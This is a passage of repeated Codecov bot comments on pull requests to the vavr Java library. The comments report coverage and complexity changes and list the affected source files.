96.66% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple5.java | 100% <\u00f8> (\u00f8) | 45 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.14% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple6.java | 100% <\u00f8> (\u00f8) | 51 <0> (\u00f8) | :arrow_down: |\n| ...src/main/java/io/vavr/collection/TreeMultimap.java | 91.01% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 92.68% <\u00f8> (-0.11%) | 197 <0> (+4) | |\n| ...avr-test/src/main/java/io/vavr/test/Checkable.java | 100% <\u00f8> (\u00f8) | 10 <0> (\u00f8) | :arrow_down: |\n| ... and 172 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f124b20...495d397. Read the comment docs.\n. # Codecov Report\nMerging #2175 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2175   +/-\n=========================================\n  Coverage     97.44%   97.44%         \n  Complexity     5260     5260         \n=========================================\n  Files            92       92         \n  Lines         12063    12063         \n  Branches       1596     1596         \n=========================================\n  Hits          11755    11755         \n  Misses          151      151         \n  Partials        157      157\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f124b20...0d13ff0. Read the comment docs.\n. # Codecov Report\nMerging #2177 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2177   +/-\n=========================================\n  Coverage     97.44%   97.44%         \n  Complexity     5260     5260         \n=========================================\n  Files            92       92         \n  Lines         12063    12063         \n  Branches       1596     1596         \n=========================================\n  Hits          11755    11755         \n  Misses          151      151         \n  Partials        157      157\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d7a6d61...916ab96. Read the comment docs.\n. # Codecov Report\nMerging #2179 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2179      +/-\n============================================\n+ Coverage     97.44%   97.45%   +<.01%   \n  Complexity     5260     5260            \n============================================\n  Files            92       92            \n  Lines         12063    12063            \n  Branches       1596     1595       -1   \n============================================\n+ Hits          11755    11756       +1   \n  Misses          151      151            \n+ Partials        157      156       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <100%> (\u00f8) | 34 <2> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 79.31% <0%> (+0.86%) | 26% <0%> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update faeb00c...4f87446. Read the comment docs.\n. # Codecov Report\nMerging #2180 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2180   +/-\n=========================================\n  Coverage     97.44%   97.44%         \n  Complexity     5260     5260         \n=========================================\n  Files            92       92         \n  Lines         12063    12063         \n  Branches       1595     1595         \n=========================================\n  Hits          11755    11755         \n  Misses          151      151         \n  Partials        157      157\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 93.36% <\u00f8> (\u00f8) | 144 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Tree.java | 97.92% <100%> (\u00f8) | 123 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4b473ed...87cad59. Read the comment docs.\n. # Codecov Report\nMerging #2181 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2181   +/-\n=========================================\n  Coverage     97.44%   97.44%         \n  Complexity     5260     5260         \n=========================================\n  Files            92       92         \n  Lines         12063    12063         \n  Branches       1595     1595         \n=========================================\n  Hits          11755    11755         \n  Misses          151      151         \n  Partials        157      157\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction1.java | 96.77% <\u00f8> (\u00f8) | 18 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function0.java | 93.75% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction5.java | 96.87% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple5.java | 100% <\u00f8> (\u00f8) | 45 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.14% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple8.java | 100% <\u00f8> (\u00f8) | 63 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple.java | 100% <\u00f8> (\u00f8) | 26 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction2.java | 96.55% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <\u00f8> (\u00f8) | 26 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function4.java | 95% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ... and 20 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ba70e8b...4ef3aa5. Read the comment docs.\n. # Codecov Report\nMerging #2186 into master will decrease coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2186      +/-\n============================================\n- Coverage     97.44%   97.42%   -0.02%   \n+ Complexity     5260     5245      -15   \n============================================\n  Files            92       92            \n  Lines         12063    12062       -1   \n  Branches       1595     1595            \n============================================\n- Hits          11755    11752       -3   \n- Misses          151      153       +2   \n  Partials        157      157\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...c/main/java/io/vavr/match/annotation/Patterns.java | | | |\n| vavr/src/main/java/io/vavr/$.java | 57.14% <0%> (\u00f8) | 0% <0%> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0e31c50...5e62eb6. Read the comment docs.\n. # Codecov Report\nMerging #2187 into master will increase coverage by 0.04%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2187      +/-\n============================================\n+ Coverage     97.42%   97.47%   +0.04%   \n  Complexity     5245     5245            \n============================================\n  Files            92       92            \n  Lines         12062    12029      -33   \n  Branches       1595     1586       -9   \n============================================\n- Hits          11752    11725      -27   \n+ Misses          153      150       -3   \n+ Partials        157      154       -3\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 93.39% <\u00f8> (+1.28%) | 23 <0> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.49% <\u00f8> (+0.22%) | 1 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update df456b1...f29e511. Read the comment docs.\n. # Codecov Report\nMerging #2188 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2188   +/-\n=========================================\n  Coverage     97.42%   97.42%         \n  Complexity     5245     5245         \n=========================================\n  Files            92       92         \n  Lines         12062    12062         \n  Branches       1595     1595         \n=========================================\n  Hits          11752    11752         \n  Misses          153      153         \n  Partials        157      157\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update df456b1...af4c7d1. Read the comment docs.\n. # Codecov Report\nMerging #2189 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2189      +/-\n============================================\n+ Coverage     97.42%   97.43%   +<.01%   \n- Complexity     5245     5250       +5   \n============================================\n  Files            92       92            \n  Lines         12062    12069       +7   \n  Branches       1595     1597       +2   \n============================================\n+ Hits          11752    11759       +7   \n  Misses          153      153            \n  Partials        157      157\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.06% <100%> (\u00f8) | 57 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.7% <100%> (+0.07%) | 98 <3> (+3) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update df456b1...f76409a. Read the comment docs.\n. # Codecov Report\nMerging #2192 into master will decrease coverage by 0.34%.\nThe diff coverage is 63.63%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2192      +/-\n============================================\n- Coverage     97.47%   97.13%   -0.35%   \n- Complexity     5250     5262      +12   \n============================================\n  Files            92       93       +1   \n  Lines         12036    12135      +99   \n  Branches       1588     1588            \n============================================\n+ Hits          11732    11787      +55   \n- Misses          150      194      +44   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Collections.java | 94.87% <100%> (\u00f8) | 126 <0> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.5% <100%> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple3.java | 100% <100%> (\u00f8) | 33 <1> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <100%> (\u00f8) | 34 <1> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 48 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <100%> (\u00f8) | 36 <2> (+2) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple8.java | 100% <100%> (\u00f8) | 63 <1> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple7.java | 100% <100%> (\u00f8) | 57 <1> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple5.java | 100% <100%> (\u00f8) | 45 <1> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 44 <0> (\u00f8) | :arrow_down: |\n| ... and 10 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 756cdc6...2d0ebf6. Read the comment docs.\n. # Codecov Report\nMerging #2193 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2193      +/-\n============================================\n+ Coverage     97.13%   97.13%   +<.01%   \n- Complexity     5262     5264       +2   \n============================================\n  Files            93       93            \n  Lines         12135    12145      +10   \n  Branches       1588     1589       +1   \n============================================\n+ Hits          11787    11797      +10   \n  Misses          194      194            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99.01% <100%> (\u00f8) | 268 <1> (+1) | :arrow_up: |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.22% <100%> (\u00f8) | 180 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 325e7e1...657f55d. Read the comment docs.\n. # Codecov Report\nMerging #2195 into master will decrease coverage by <.01%.\nThe diff coverage is 96.22%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2195      +/-\n============================================\n- Coverage     97.14%   97.14%   -0.01%   \n- Complexity     5262     5267       +5   \n============================================\n  Files            93       93            \n  Lines         12143    12140       -3   \n  Branches       1589     1590       +1   \n============================================\n- Hits          11796    11793       -3   \n  Misses          193      193            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.7% <\u00f8> (\u00f8) | 98 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 93.72% <100%> (\u00f8) | 141 <2> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/$.java | 66.66% <100%> (+3.5%) | 0 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Validation.java | 98.1% <95.83%> (-0.05%) | 63 <15> (+5) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 711f179...41c17e0. Read the comment docs.\n. # Codecov Report\nMerging #2196 into master will increase coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2196      +/-\n============================================\n+ Coverage     97.14%   97.15%   +0.01%   \n- Complexity     5267     5269       +2   \n============================================\n  Files            93       93            \n  Lines         12140    12140            \n  Branches       1590     1590            \n============================================\n+ Hits          11793    11795       +2   \n+ Misses          193      192       -1   \n+ Partials        154      153       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.05% <0%> (+0.94%) | 65% <0%> (+2%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update fe4c1f5...65388e7. Read the comment docs.\n. # Codecov Report\nMerging #2197 into master will increase coverage by <.01%.\nThe diff coverage is 92.94%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2197      +/-\n============================================\n+ Coverage     97.15%   97.15%   +<.01%   \n- Complexity     5269     5270       +1   \n============================================\n  Files            93       93            \n  Lines         12140    12145       +5   \n  Branches       1590     1593       +3   \n============================================\n+ Hits          11795    11800       +5   \n+ Misses          192      191       -1   \n- Partials        153      154       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <100%> (\u00f8) | 120 <36> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 79.33% <80.64%> (+0.89%) | 27 <10> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5a5d10a...99fab12. Read the comment docs.\n. # Codecov Report\nMerging #2208 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2208      +/-\n============================================\n+ Coverage     97.15%   97.16%   +<.01%   \n- Complexity     5270     5273       +3   \n============================================\n  Files            93       93            \n  Lines         12145    12155      +10   \n  Branches       1593     1595       +2   \n============================================\n+ Hits          11800    11810      +10   \n  Misses          191      191            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.69% <100%> (\u00f8) | 212 <0> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.82% <100%> (\u00f8) | 349 <0> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b6b5b1a...9f27c82. Read the comment docs.\n. # Codecov Report\nMerging #2210 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2210   +/-\n=========================================\n  Coverage     97.15%   97.15%         \n  Complexity     5270     5270         \n=========================================\n  Files            93       93         \n  Lines         12145    12145         \n  Branches       1593     1593         \n=========================================\n  Hits          11800    11800         \n  Misses          191      191         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b6b5b1a...f097b86. Read the comment docs.\n. # Codecov Report\nMerging #2211 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2211      +/-\n============================================\n+ Coverage     97.15%   97.16%   +<.01%   \n- Complexity     5270     5271       +1   \n============================================\n  Files            93       93            \n  Lines         12145    12149       +4   \n  Branches       1593     1593            \n============================================\n+ Hits          11800    11804       +4   \n  Misses          191      191            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.06% <100%> (+0.01%) | 66 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update eaf87b8...91e77f3. Read the comment docs.\n. # Codecov Report\nMerging #2212 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2212   +/-\n=========================================\n  Coverage     97.15%   97.15%         \n  Complexity     5270     5270         \n=========================================\n  Files            93       93         \n  Lines         12145    12145         \n  Branches       1593     1593         \n=========================================\n  Hits          11800    11800         \n  Misses          191      191         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <100%> (\u00f8) | 120 <2> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update eaf87b8...ff11953. Read the comment docs.\n. # Codecov Report\nMerging #2214 into master will decrease coverage by 0.01%.\nThe diff coverage is 86.36%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2214      +/-\n============================================\n- Coverage     97.15%   97.13%   -0.02%   \n- Complexity     5270     5279       +9   \n============================================\n  Files            93       94       +1   \n  Lines         12145    12167      +22   \n  Branches       1593     1593            \n============================================\n+ Hits          11800    11819      +19   \n- Misses          191      194       +3   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.7% <\u00f8> (\u00f8) | 98 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 92.79% <\u00f8> (\u00f8) | 193 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/CheckedPredicate.java | 71.42% <83.33%> (+71.42%) | 4 <3> (+3) | :arrow_up: |\n| vavr/src/main/java/io/vavr/CheckedRunnable.java | 87.5% <87.5%> (\u00f8) | 3 <3> (?) | |\n| vavr/src/main/java/io/vavr/CheckedConsumer.java | 90% <87.5%> (-10%) | 5 <3> (+3) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update eaf87b8...8bb2717. Read the comment docs.\n. # Codecov Report\nMerging #2216 into master will increase coverage by 0.49%.\nThe diff coverage is 99.11%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2216      +/-\n============================================\n+ Coverage     97.14%   97.63%   +0.49%   \n- Complexity     5282     5344      +62   \n============================================\n  Files            94       93       -1   \n  Lines         12177    12683     +506   \n  Branches       1595     1585      -10   \n============================================\n+ Hits          11829    12383     +554   \n+ Misses          194      149      -45   \n+ Partials        154      151       -3\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.83% <\u00f8> (\u00f8) | 140 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Predicates.java | 85.71% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction4.java | 96.66% <\u00f8> (-0.11%) | 13 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function3.java | 94.44% <\u00f8> (-0.3%) | 10 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction6.java | 96.87% <\u00f8> (-0.1%) | 13 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function5.java | 95% <\u00f8> (-0.24%) | 10 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction5.java | 96.77% <\u00f8> (-0.11%) | 13 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function2.java | 94.11% <\u00f8> (-0.33%) | 10 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 96% <\u00f8> (-0.16%) | 15 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function6.java | 95.23% <\u00f8> (-0.22%) | 10 <0> (-1) | |\n| ... and 71 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f3afd61...ab46d23. Read the comment docs.\n. # Codecov Report\nMerging #2218 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2218   +/-\n=========================================\n  Coverage     97.14%   97.14%         \n  Complexity     5282     5282         \n=========================================\n  Files            94       94         \n  Lines         12177    12177         \n  Branches       1595     1595         \n=========================================\n  Hits          11829    11829         \n  Misses          194      194         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.66% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.74% <\u00f8> (\u00f8) | 137 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f3afd61...76320da. Read the comment docs.\n. # Codecov Report\nMerging #2221 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2221      +/-\n============================================\n+ Coverage     97.14%   97.16%   +0.01%   \n- Complexity     5282     5326      +44   \n============================================\n  Files            94       94            \n  Lines         12177    12257      +80   \n  Branches       1595     1595            \n============================================\n+ Hits          11829    11909      +80   \n  Misses          194      194            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/Tuple8.java | 100% <\u00f8> (\u00f8) | 63 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple3.java | 100% <100%> (\u00f8) | 39 <6> (+6) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple6.java | 100% <100%> (\u00f8) | 54 <3> (+3) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple4.java | 100% <100%> (\u00f8) | 44 <5> (+5) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple5.java | 100% <100%> (\u00f8) | 49 <4> (+4) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple7.java | 100% <100%> (\u00f8) | 59 <2> (+2) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple2.java | 100% <100%> (\u00f8) | 36 <7> (+7) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple0.java | 100% <100%> (\u00f8) | 23 <9> (+9) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Tuple1.java | 100% <100%> (\u00f8) | 26 <8> (+8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 47f162a...a6218ad. Read the comment docs.\n. # Codecov Report\nMerging #2222 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2222   +/-\n=========================================\n  Coverage     97.14%   97.14%         \n  Complexity     5282     5282         \n=========================================\n  Files            94       94         \n  Lines         12177    12177         \n  Branches       1595     1595         \n=========================================\n  Hits          11829    11829         \n  Misses          194      194         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <100%> (\u00f8) | 120 <1> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 47f162a...1f6b7eb. Read the comment docs.\n. # Codecov Report\nMerging #2224 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2224   +/-\n=========================================\n  Coverage     97.14%   97.14%         \n  Complexity     5282     5282         \n=========================================\n  Files            94       94         \n  Lines         12177    12177         \n  Branches       1595     1595         \n=========================================\n  Hits          11829    11829         \n  Misses          194      194         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 47f162a...0733664. Read the comment docs.\n. # Codecov Report\nMerging #2226 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2226      +/-\n============================================\n+ Coverage     97.14%   97.15%   +<.01%   \n- Complexity     5282     5285       +3   \n============================================\n  Files            94       94            \n  Lines         12177    12178       +1   \n  Branches       1595     1595            \n============================================\n+ Hits          11829    11831       +2   \n+ Misses          194      193       -1   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.75% <100%> (+0.01%) | 139 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 93.89% <0%> (+0.38%) | 162% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d43c10c...9bde2db. Read the comment docs.\n. # Codecov Report\nMerging #2227 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2227      +/-\n============================================\n- Coverage     97.16%   97.15%   -0.01%   \n- Complexity     5282     5283       +1   \n============================================\n  Files            94       94            \n  Lines         12141    12177      +36   \n  Branches       1581     1595      +14   \n============================================\n+ Hits          11797    11831      +34   \n- Misses          191      193       +2   \n  Partials        153      153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 93.39% <0%> (-0.57%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.72% <0%> (-0.21%) | 141% <0%> (\u00f8) | |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <0%> (\u00f8) | 242% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.69% <0%> (\u00f8) | 212% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.5% <0%> 